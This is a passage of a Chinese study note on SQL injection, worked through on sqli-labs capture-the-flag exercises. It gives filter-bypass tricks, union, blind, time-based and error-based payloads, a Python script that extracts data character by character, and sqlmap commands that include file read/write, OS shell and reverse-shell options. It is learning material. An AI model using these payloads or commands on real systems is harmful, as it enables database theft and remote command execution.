<font style="color:rgb(77, 77, 77);">会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</font>

```sql
select column_name  from information_schema.tables where table_name="users"
```

<font style="color:rgb(77, 77, 77);">这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</font>  
<font style="color:rgb(77, 77, 77);">users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</font>

```sql
select column_name  from information_schema.tables where table_name=0x7573657273
```

#### 宽字节绕过
<font style="color:rgb(77, 77, 77);">过滤单引号时，可以试试宽字节</font>

<font style="color:rgb(77, 77, 77);">过滤 ' 的时候往往利用的思路是将 ' 转换为 ' 。</font>

<font style="color:rgb(77, 77, 77);">在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字</font>

<font style="color:#601bde;">%df</font><font style="color:rgb(77, 77, 77);"> 吃掉 \ 具体的方法是 urlencode(’) = </font><font style="color:#601bde;">%5c%27</font><font style="color:rgb(77, 77, 77);">，我们在 </font><font style="color:#601bde;">%5c%27</font><font style="color:rgb(77, 77, 77);"> 前面添加 </font><font style="color:#601bde;">%df</font><font style="color:rgb(77, 77, 77);"> ，形成</font><font style="color:#601bde;">%df%5c%27 </font><font style="color:rgb(77, 77, 77);">，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，</font><font style="color:#601bde;">%df%5c</font><font style="color:rgb(77, 77, 77);"> 就是一个汉字，</font><font style="color:#601bde;">%27</font><font style="color:rgb(77, 77, 77);"> 作为一个单独的 ’ 符号在外面：</font>

```sql
id=-1%df%27union select 1,user(),3--+
```

### 11.对于逗号的绕过
<font style="color:rgb(77, 77, 77);">sql盲注时常用到以下的函数：</font>

```sql
substr()
substr(string, pos, len):从pos开始，取长度为len的子串
substr(string, pos):从pos开始，取到string的最后

substring()
用法和substr()一样

mid()
用法和substr()一样，但是mid()是为了向下兼容VB6.0，已经过时，以上的几个函数的pos都是从1开始的

left()和right()
left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串

limit
limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始

ascii()和char()
ascii(char):把char这个字符转为ascii码
char(ascii_int):和ascii()的作用相反，将ascii码转字符
```

#### **<font style="color:#000000;">对于substr()和mid()这两个方法可以使用from for 的方式来解决</font>**
```sql
 select substr(database() from 1 for 1)='c';
```

#### <font style="color:#000000;">使用join关键字来绕过</font>
```sql
union select 1,2,3,4;
union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);
union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);
```

#### <font style="color:#000000;">使用like关键字 适用于substr()等提取子串的函数中的逗号</font>
```sql
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'
```

#### <font style="color:#000000;">使用offset关键字</font>
```sql
 select * from cms_users limit 0,1;
# 等价于下面这条SQL语句
 select * from cms_users limit 1 offset 0;
```

### 12.过滤函数绕过
#### sleep()被过滤时
sleep()时延时盲注中最常见的函数 当sleep()被过滤时可以使用benchmark()来代替

```sql
sleep() -->benchmark()
select 12,23 and sleep(1);
参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式
select 12,23 and benchmark(10000000,1);
```

#### ascii()被过滤时
```sql
ascii()–>hex()、bin()
替代之后再使用对应的进制转string即可
```

#### group_concat()被过滤时
```sql
group_concat()–>concat_ws()
select group_concat(“str1”,“str2”);#等价于
select concat_ws(“,”,“str1”,“str2”);
```

#### <font style="color:#000000;">substr(),substring(),mid()被过滤时</font>
```sql
substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()
```

#### <font style="color:#000000;">user() datadir ord()被过滤时</font>
```sql
user() --> @@user、datadir–>@@datadir
ord()–>ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。
```

#### <font style="color:#000000;">过滤了if函数：</font>
```sql
if函数的判断语句
select if(substr(database(),1,1)='c',1,0);
IFNULL函数
select ifnull(substr(database(),1,1)='c',0);
case when then函数
select case substr(database(),1,1)='c' when 1 then 1 else 0 end;
```

## 七、注入方式及工具 sqlmap 的使用
### sqlmap 工具安装及介绍
#### **安装;**[**安装教程**](https://www.cnblogs.com/hai-long/p/10384752.html)
1、配置好 python

2、到 [github](https://github.com/sqlmapproject/sqlmap) 上下载 源码解压就可以，

#### 使用方法
**参考文章：**

[**sqlmap超详细笔记+思维导图**](https://www.cnblogs.com/bmjoker/p/9326258.html)

[**SQLMAP注入教程-11种常见SQLMAP使用方法详解**](https://www.cnblogs.com/ichunqiu/p/5805108.html)

**各种参数的含义**

```sql
-u  #注入网址
-f  #指纹判别数据库类型 
-b  #获取数据库版本信息 
-p  #指定可测试的参数(?page=1&id=2 -p "page,id") 
-D ""  #指定数据库名 
-T ""  #指定表名 
-C ""  #指定字段 
-s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) 
--level=(1-5) #要执行的测试水平等级，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1 
--time-sec=(2,5) #延迟响应，默认为5 
--data #通过POST发送数据 
--columns        #列出字段 
--current-user   #获取当前用户名称 
--current-db     #获取当前数据库名称 
--users          #列数据库所有用户 
--passwords      #数据库用户所有密码 
--privileges     #查看用户权限(--privileges -U root) 
-U               #指定数据库用户 
--dbs            #列出所有数据库 
--tables -D ""   #列出指定数据库中的表 
--columns -T "user" -D "mysql"      #列出mysql数据库中的user表的所有字段 
--dump-all            #列出所有数据库所有表 
--exclude-sysdbs      #只列出用户自己新建的数据库和表 
--dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
--dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
--os      #指定系统(Linux,Windows) 
-v  #详细的等级(0-6) 
    0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容 
--privileges  #查看权限 
--is-dba      #是否是数据库管理员 
--roles       #枚举数据库用户角色 
--udf-inject  #导入用户自定义函数（获取系统权限） 
--union-check  #是否支持union 注入 
--union-cols #union 查询表记录 
--union-test #union 语句测试 
--union-use  #采用union 注入 
--union-tech orderby #union配合order by 
--data "" #POST方式提交数据(--data "page=1&id=2") 
--cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
--referer ""     #使用referer欺骗(--referer "http://www.baidu.com") 
--user-agent ""  #自定义user-agent 
--proxy "http://127.0.0.1:8118" #代理注入 
--string=""    #指定关键词,字符串匹配. 
--threads 　　  #采用多线程(--threads 3) 
--sql-shell    #执行指定sql命令 
--sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) 
--file-read    #读取指定文件 
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
--file-dest    #要写入的文件绝对路径 
--os-cmd=id    #执行系统命令 
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
--os-smbrelay  # 
--os-bof       # 
--reg-read     #读取win系统注册表 
--priv-esc     # 
--time-sec=    #延迟设置 默认--time-sec=5 为5秒 
-p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入 
--eta          #盲注 
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典　　　 
common-outputs.txt 
common-tables.txt      表字典 
keywords.txt 
oracle-default-passwords.txt 
user-agents.txt 
wordlist.txt 
```

**其他的不多说了，各个题型的 sqlmap 用法在下面都写了，有过滤的没写，还不会写脚本**

### 联合注入
重要函数

```sql
# 将查到的一个字段内的所有数据，合并为一个字符串输出
group_concat()
# 联合注入的时候我们要让前面的无法输出（前面的设为-1），这样后面的才能输出
```

**手注的话，在上面已经讲了**

**使用工具 sqlmap，以第一题为例**

**输入下面的东西，先爆库**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112171042-c685cd58-b659-43c8-a9a7-a077af1b4f6f.png)

第**一个问我们是否要跳过测试其他 payload，选是。**

**第二个看不懂，也选是**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112247647-d6d0c041-c3eb-43f4-ae5b-a54d9576b925.png)

**问我们是否要测试其他参数，选否**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112351197-d99fea57-d183-43d2-b516-201802c9ee8e.png)

**库名**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112398763-f110802b-de7b-42c6-9003-5bdeab80dbd8.png)

**爆表**

```sql
python sqlmap.py -u http://fb38469f-e856-4765-99c5-a785393f23ee.node5.buuoj.cn/Less-1/?id=1 -D ctftraining --tables
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112621785-51019acd-566a-4a2d-904a-ab3c3d88b840.png)

**爆字段**

```sql
python sqlmap.py -u http://fb38469f-e856-4765-99c5-a785393f23ee.node5.buuoj.cn/Less-1/?id=1 -D ctftraining -T flag --columns
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112688036-425f3ee2-72ed-4ac8-b2f8-5319c40d6573.png)

**爆数据**

```sql
python sqlmap.py -u http://fb38469f-e856-4765-99c5-a785393f23ee.node5.buuoj.cn/Less-1/?id=1 -D ctftraining -T flag -C flag -dump
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112497811-d50e4ed5-b2c5-4d9a-b6c1-6dfe52385903.png)

**结果**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112540130-8a2be891-6007-41c5-9bb9-eb3f8d19ca24.png)

### 布尔盲注
#### 含义：
**布尔盲注的特点是，正确会有回显，错误没有回显。做题时，需要判断回显正确的条件是什么**

#### 重要函数
```sql
# 获取字符串str长度
length(str)
# 截取字符串,a是待截取的字符串，b是开始截取的位置（0号位是1），c是截取的长度
substr(a,1,1)
# 获取字符a的ascii码
ascii(a)
# 注意！！！
# 在包含select句子时，应该多加个括号
```

#### 以 Less5 为例(已知单引号闭合)
##### 不使用 sqlmap
###### 判断数据库长度
**先试试 50，正确**

```sql
?id=1' and length((select group_concat(schema_name) from information_schema.schemata))>50--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732069082523-7f006779-3071-498e-a32e-b6ad887f2b74.png)

**再看看 70，不对**

```sql
?id=1' and length((select group_concat(schema_name) from information_schema.schemata))>70--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732069166563-85d98fae-70e9-4a21-b0d1-b39741bf27a0.png)

**多试试，最后发现长度 69 是对的**

```sql
?id=1' and length((select group_concat(schema_name) from information_schema.schemata))>69--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732069241455-061a4800-b03d-4140-8143-76fca65d1ec2.png)

###### 再判断判断具体字符
**这个字符的 ascii 码是大于 90 的**

```sql
?id=1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))>90--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732070032879-81b56711-4443-4b06-ac9f-2df331ffb462.png)

**再看看这个字符的 ascii 码是大于 100 的吗?不是**

```sql
?id=1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))>100--+
```

**多次实验，得到第一个字符的 ascii 值为 99**

```sql
?id=1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=99--+
?id=1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=20--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732070327459-2f2a4967-5886-4c45-867b-686f5616a251.png)

**但是这样搞效率太慢了，试试 burp 爆破**

**先抓包，然后在这个地方添加位置**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732091256400-7297b7ee-c1e2-4909-aa9c-07fe71363694.png)

**然后添加 payload 格式**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732092145130-8f248477-7c85-44c7-b151-bb24f5131415.png)

**可以再加个内容匹配或者不加**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732091412706-cee6376e-5dba-4e2c-adde-ff8c5110ddea.png)

**最后结果，第一个字符 ascii 码值为 99**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732091459921-fc74eebe-bd24-40bd-9ef8-ebc7c5d312d0.png)

**之后再尝试其他位置，这样也好麻烦，而且最后还要转换为字符。**

**或者用脚本，也有点慢，5，6 分钟（还是推荐字符串长度用手注，具体内容再用脚本）**

**现在拿到了具体内容，如下。（脚本会在这题末尾粘出来）**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732074714652-9b1e984e-78e1-41a7-9ba6-f40d07113889.png)

###### 判断需要的数据库的所有表的长度
**手注格式**

```sql
?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema="ctftraining"))=14--+
```

脚本遍历一下，共 15 个字符

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732092510928-87784244-42f2-44ea-bd07-0e84e9f6b844.png)

###### 再判断判断所有表具体字符
**手注格式如下**

```sql
?id=1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctftraining"),15,1))=113--+
```

**脚本爆破**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732092353398-528f5666-edd1-4148-bf8b-5393aeadf44b.png)

###### 判断需要的所有表中所有字段的长度
**手注格式**

```sql
?id=1' and length((select group_concat(column_name) from information_schema.columns where table_name="flag"))=4--+
```

**遍历结果**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732092872807-a999926b-02eb-48dc-b583-bc59ad4439c0.png)



###### 再判断判断所有字段具体字符
```sql
?id=1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flag"),1,1))=102--+
```

**字段名是 flag**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732093126509-ba02354c-c561-4e58-aaa4-b05266b0a720.png)



###### 判断需要的该字段下所有内容的长度
```sql
?id=1' and length((select group_concat(flag) from "ctftraining.flag"))=148--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732093796889-79a838c6-225b-45df-9418-ac90d372c3da.png)





###### 再判断判断所有内容具体字符
```sql
?id=1' and ascii(substr((select group_concat(flag) from ctftraining.flag),42,1))=125--+
```

结束

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732094370628-500466f8-f997-4b84-8433-c1e6119926e9.png)

###### 脚本代码
**（自己写的，水平有限，不够简洁，效率一般）**

```sql
import requests

url = 'http://723a482f-9b9c-4575-9450-a15ea380958e.node5.buuoj.cn/Less-5/'
sqli_length={
    'sqli_db':'length((select group_concat(schema_name) from information_schema.schemata))',
    'sqli_table':'length((select group_concat(table_name) from information_schema.tables where table_schema="ctftraining"))',
    'sqli_column':'length((select group_concat(column_name) from information_schema.columns where table_name="flag"))',
    'sqli_flag':'length((select group_concat(flag) from ctftraining.flag))'
}
sqli_str={
    'sqli_db':'substr((select group_concat(schema_name) from information_schema.schemata)',
    'sqli_table':'substr((select group_concat(table_name) from information_schema.tables where table_schema="ctftraining")',
    'sqli_column':'substr((select group_concat(column_name) from information_schema.columns where table_name="flag")',
    'sqli_flag':'substr((select group_concat(flag) from ctftraining.flag)'
}


def check_db_length():
    for i in range(1,100):
        url_db =url+"?id=1' and "+sqli_length['sqli_db']+f"={i}--+"
        resp = requests.get(url_db)
        if 'You are in...........' in resp.text:
            return i

def check_db_str():
    answer=''
    for i in range(1,check_db_length()+1):
        for j in range(1,128):
            url_db =url+"?id=1' and "+"ascii("+sqli_str['sqli_db']+f",{i},1))={j}--+"
            resp = requests.get(url_db)
            if 'You are in...........' in resp.text:
                answer += chr(j)
                print(chr(j))
                break
        print(f'{i}号位结束')
    return answer

def check_table_length():
    for i in range(1,100):
        url_table =url+"?id=1' and "+sqli_length['sqli_table']+f"={i}--+"
        print(url_table)
        resp = requests.get(url_table)
        if 'You are in...........' in resp.text:
            return i

def check_table_str():
    answer = ''
    for i in range(1, check_table_length() + 1):
        for j in range(1, 128):
            url_table = url + "?id=1' and " + "ascii(" + sqli_str['sqli_table'] + f",{i},1))={j}--+"
            print(url_table)
            resp = requests.get(url_table)
            if 'You are in...........' in resp.text:
                answer += chr(j)
                print(chr(j))
                break
        print(f'{i}号位结束')
    return answer

def check_column_length():
    for i in range(1,100):
        url_column =url+"?id=1' and "+sqli_length['sqli_column']+f"={i}--+"
        print(url_column)
        resp = requests.get(url_column)
        if 'You are in...........' in resp.text:
            return i

def check_column_str():
    answer = ''
    for i in range(1, check_column_length() + 1):
        for j in range(1, 128):
            url_column = url + "?id=1' and " + "ascii(" + sqli_str['sqli_column'] + f",{i},1))={j}--+"
            print(url_column)
            resp = requests.get(url_column)
            if 'You are in...........' in resp.text:
                answer += chr(j)
                print(chr(j))
                break
        print(f'{i}号位结束')
    return answer

def check_flag_length():
    for i in range(1,200):
        url_flag =url+"?id=1' and "+sqli_length['sqli_flag']+f"={i}--+"
        print(url_flag)
        resp = requests.get(url_flag)
        if 'You are in...........' in resp.text:
            return i

def check_flag_str():
    answer = ''
    for i in range(1, check_flag_length() + 1):
        for j in range(1, 128):
            url_flag = url + "?id=1' and " + "ascii(" + sqli_str['sqli_flag'] + f",{i},1))={j}--+"
            print(url_flag)
            resp = requests.get(url_flag)
            if 'You are in...........' in resp.text:
                answer += chr(j)
                print(chr(j))
                break
        print(f'{i}号位结束')
    return answer

print(check_flag_str())
```

##### 使用 sqlmap
**爆库**

```sql
python sqlmap.py -u http://fb38469f-e856-4765-99c5-a785393f23ee.node5.buuoj.cn/Less-5/?id=1 --technique B -dbs
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732113307128-40644e42-e33c-440f-a4bb-11b0e53a7bba.png)

**爆表**

```sql
python sqlmap.py -u http://fb38469f-e856-4765-99c5-a785393f23ee.node5.buuoj.cn/Less-5/?id=1 --technique B -D ctftraining --tables
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732113549906-af7d6fb8-7d32-4e74-b309-2da7415da9ec.png)

**爆列**

```sql
python sqlmap.py -u http://fb38469f-e856-4765-99c5-a785393f23ee.node5.buuoj.cn/Less-5/?id=1 --technique B -D ctftraining -T flag --columns
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732113600230-bd6553b7-0594-4703-ab87-22c7cadb1adb.png)

**爆数据**

```sql
python sqlmap.py -u http://fb38469f-e856-4765-99c5-a785393f23ee.node5.buuoj.cn/Less-5/?id=1 --technique B -D ctftraining -T flag -C flag --dump
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732113669453-2f39638a-5af6-4668-8f20-8ece070d7668.png)

### 延时盲注
**含义：**

**因为无论输入什么，结果都一样。在布尔盲注的基础上加上时间函数，以出现回显的时间是否延迟为判断条件**

#### 重要函数
```sql
# a是判断条件，正确就执行b，错误就执行c
if(a,b,c)
# 延时函数，a代表秒数
sleep(a)
```

#### 以 Less9 为例
##### 手注（演示）
**判断闭合类型**

**第一个延时了，第二个没延时。为单引号闭合**

```sql
?id=1' and if(1=1,sleep(5),1)--+
?id=1" and if(1=1,sleep(5),1)--+
```

**判断数据库长度**

```sql
?id=1' and if(length((select group_concat(schema_name) from information_schema.schemata))>10,sleep(5),1)--+
```

**判断数据库具体字符**

```sql
?id=1' and if(ascii(substr(((select group_concat(schema_name) from information_schema.schemata)),1,1))>10,sleep(5),1)--+
```

**其他的不演试了，这函数嵌套的太多了**

##### **使用 sqlmap**
**不用 sqlmap 的话，写脚本我不会写，水平有限**

```sql
python sqlmap.py -u http://fb38469f-e856-4765-99c5-a785393f23ee.node5.buuoj.cn/Less-9/?id=1 --technique T --dbs
```

**这里多了一个新选项，还是看不懂，选是**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732114103339-6aa0d45b-46fa-451a-b5ae-9eccd72ac4a2.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732114314086-100af4c4-8299-4028-bafc-2bd832c20604.png)

**后面还是老套路，直接跳最后一步吧**

```sql
python sqlmap.py -u http://fb38469f-e856-4765-99c5-a785393f23ee.node5.buuoj.cn/Less-9/?id=1 --technique T -D ctftraining -T flag -C flag --dump
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732116546294-d5cb9ccb-bf3d-4399-8974-b9cdfa88f4b4.png)

### POST 型注入
**是把注入点由 get 方式换为了 post 方式**

**以 Less11 为例**

#### 手注
**给了俩框**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732159762288-1c950041-986f-436e-bc2b-d5fbb75b31c6.png)

抓下包

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732159872021-dcbd89ac-8602-46cb-9e5d-b25c18f5dd78.png)

测试一下闭合，输入 1'，出现错误信息，而 1"没有错误信息

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732161165987-c3628174-dd88-4757-bcd8-0f989143073d.png)

输入恒等式测试，成功。看出是单引号闭合

```sql
1' or 1=1#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732161343221-ca242211-3caa-4729-ab83-8e3dfae033ae.png)

或者输入转义字符，看出单引号闭合

```sql
1\
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732161446432-3dc4a1a4-1d56-4a88-90e8-f6205f31b0f8.png)

接下来就是联合注入了

```sql
-1' union select 1,group_concat(schema_name) from information_schema.schemata#
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'#
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'#
-1' union select 1,group_concat(flag) from ctftraining.flag#
```

#### 使用 sqlmap
使用 burp 抓包，之后右键复制到文件，使用 txt 后缀

之后进入 sqlmap，按如下格式输入

比如我保存在 post_test 文件夹下

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732162828346-51296ff1-e954-40a7-aa32-cd5c7be63b0b.png)

```sql
python sqlmap.py -r post_test\less11.txt -dbs
```

成功爆库

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732162847444-a44cb980-b1ab-4c24-bb3f-47fdf887475e.png)

### 报错注入
#### 原理：
**报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。是一种页面响应形式。**

**响应过程：**

> **用户在前台页面输入检索内容**![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732244222875-145b09d5-dff6-4da4-a827-f1e56ccc34ea.png)**后台将前台页面上输入的检索内容****<font style="color:#fe2c24;">无加区别</font>****的拼接成sql语句，送给数据库执行**![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732244223140-0176273e-e00a-4867-a286-90a75f584170.png)**数据库将执行的结果返回后台，后台将数据库执行的结果****<font style="color:#fe2c24;">无加区别</font>****的显示在前台页面**
>

**报错注入存在基础：**

> **后台对于输入输出的合理性没有做检查**
>

#### extractvalue报错注入
```sql
EXTRACTVALUE (XML_document, XPath_string);
第一个参数：XML_document是String格式，为XML文档对象的名称
第二个参数：XPath_string (Xpath格式的字符串)
```

**补充：什么是 xml？**[**XML 学习**](about:blank)

#### **updatexml报错注入**
```sql
函数updatexml(XML_document,XPath_string,new_value)
第一个参数: XML_document是string格式，为XML文档对象的名称，例如Doc
第二个参数: XPath string是路径，XPath格式的字符串
第三个参数: new_value，string格式，替换查找到的符合条件的数据
```

#### floor报错注入
** 这种注入方式与以上两种方式原理上存在很大的区别，相对来说要复杂很多。**[**参考文章**](https://www.cnblogs.com/c1047509362/p/12806297.html)

**原理：利用select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。 ** 

```sql
# 每次产生0-1的随机数，若随机数种子一样，则产生的随机数也一样
rand()
# 计数 
count()
# 按照x分类
group by x
```

#### 例题：以 Less17 为例
**这题情景是要重置密码**

 根据页面展示是一个密码重置页面，也就是说我们已经登录系统了，然后查看我们源码，是根据我们提供的账户名去数据库查看用户名和密码，如果账户名正确那么将密码改成你输入的密码。再执行这条sql语句之前会对输入的账户名进行检查，对输入的特殊字符转义。所以我们能够利用的只有更新密码的sql语句。sql语句之前都是查询，这里有一个update更新数据库里面信息。所以之前的联合注入和布尔盲注以及时间盲注都不能用了。这里我们会用到报错注入。  

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732253469819-c8df1780-5360-4044-a23c-c9d641a4efcf.png)

##### **extractvalue报错注入**
```sql
# 爆版本
1' and (extractvalue(1,concat(0x5c,version(),0x5c)))#
# 爆当前数据库
1' and (extractvalue(1,concat(0x5c,database(),0x5c)))#
# 爆所有数据库
1' and (extractvalue(1,concat(0x5c,(select group_concat(schema_name) from information_schema.schemata),0x5c)))#
# 爆表名
1' and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema='ctftraining'),0x5c)))#
# 爆字段名
1' and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_name='flag'),0x5c)))#
# 爆字段内容
1' and (extractvalue(1,concat(0x5c,(select group_concat(flag) from ctftraining.flag),0x5c)))#
```

**只粘贴最后一步和结果**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732255050847-e0a17c31-7401-4659-aeb4-269a809994c4.png)

结果

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732255080675-c801e8f2-13d9-4920-8431-cda677c7a013.png)

##### **updatexml报错注入**
```sql
# 爆版本
1' and (updatexml(1,concat(0x5c,version(),0x5c),1))#
# 爆当前数据库
1' and (updatexml(1,concat(0x5c,database(),0x5c),1))#
# 爆所有数据库
1' and (updatexml(1,concat(0x5c,(select group_concat(schema_name) from information_schema.schemata),0x5c),1))#
# 爆表名
1' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema='ctftraining'),0x5c),1))#
# 爆字段名
1' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_name='flag'),0x5c),1))#
# 爆字段内容
1' and (updatexml(1,concat(0x5c,(select group_concat(flag) from ctftraining.flag),0x5c),1))#
```

##### sqlmap
```sql
python sqlmap.py -r post_test\less17.txt --technique E -dbs
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732257712411-9a9d5bea-e429-419c-99f7-86d83c5d2d44.png)

**后面的不说了**





